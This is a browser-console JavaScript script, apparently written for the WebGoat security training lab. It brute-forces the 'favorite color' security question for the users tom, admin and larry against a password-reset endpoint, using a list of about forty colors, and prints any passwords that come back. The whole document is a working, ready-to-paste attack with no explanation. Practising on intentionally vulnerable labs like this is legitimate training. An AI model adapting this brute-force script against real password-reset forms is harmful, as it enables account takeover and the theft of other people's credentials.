// Security Questions Attack - CORRECT ENDPOINT
// Copy and paste this into browser console

(async function() {
    console.log('===================================================================');
    console.log('SECURITY QUESTIONS BRUTE FORCE ATTACK');
    console.log('Endpoint: /WebGoat/PasswordReset/questions');
    console.log('===================================================================');
    
    // Common colors for "What is your favorite color?" question
    const colors = [
        'red', 'blue', 'green', 'yellow', 'orange', 'purple', 'pink',
        'black', 'white', 'gray', 'grey', 'brown', 'cyan', 'magenta',
        'violet', 'indigo', 'turquoise', 'gold', 'silver', 'crimson',
        'navy', 'teal', 'lime', 'maroon', 'olive', 'aqua', 'fuchsia',
        'coral', 'salmon', 'peach', 'mint', 'lavender', 'tan', 'beige',
        'scarlet', 'azure', 'emerald', 'ruby', 'sapphire', 'bronze'
    ];
    
    // Target users
    const users = ['tom', 'admin', 'larry'];
    
    const results = {};
    
    for (const user of users) {
        console.log('\n===================================================================');
        console.log('[*] Attacking user: ' + user);
        console.log('===================================================================');
          let found = false;
        
        for (const color of colors) {
            console.log('  [+] Trying: ' + color);
            
            try {
                const response = await fetch('/WebGoat/PasswordReset/questions', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        username: user,
                        securityQuestion: color
                    })
                });
                
                const data = await response.json();
                
                // Check for success
                if (data.lessonCompleted === true || 
                    (data.feedback && data.feedback.toLowerCase().includes('success')) ||
                    (data.feedback && !data.feedback.toLowerCase().includes('does not match')) ||
                    data.output) {
                    
                    console.log('\n');
                    console.log('  ========================================');
                    console.log('  [SUCCESS] Found answer for ' + user + '!');
                    console.log('  ========================================');
                    console.log('  Security Answer: ' + color);
                    console.log('  Response:', JSON.stringify(data, null, 2));
                    
                    results[user] = {
                        answer: color,
                        response: data
                    };
                    
                    found = true;
                    break;
                }
                
                // Small delay to avoid overwhelming server
                await new Promise(resolve => setTimeout(resolve, 50));
                
            } catch (error) {
                console.log('\n  [ERROR] ' + error.message);
            }
        }
        
        if (!found) {
            console.log('\n  [-] No answer found for ' + user + ' in common colors list');
            results[user] = { answer: 'NOT FOUND', response: null };
        }
    }
    
    console.log('\n\n===================================================================');
    console.log('ATTACK COMPLETED - SUMMARY');
    console.log('===================================================================');
    
    for (const user in results) {
        console.log('\nUser: ' + user);
        if (results[user].answer !== 'NOT FOUND') {
            console.log('  Answer: ' + results[user].answer);
            if (results[user].response.output) {
                console.log('  Password: ' + results[user].response.output);
            }
        } else {
            console.log('  Answer: NOT FOUND');
        }
    }
    
    console.log('\n===================================================================');
    
    // Save results to window for reference
    window.securityQuestionsResults = results;
    console.log('\nResults saved to: window.securityQuestionsResults');
    
})();
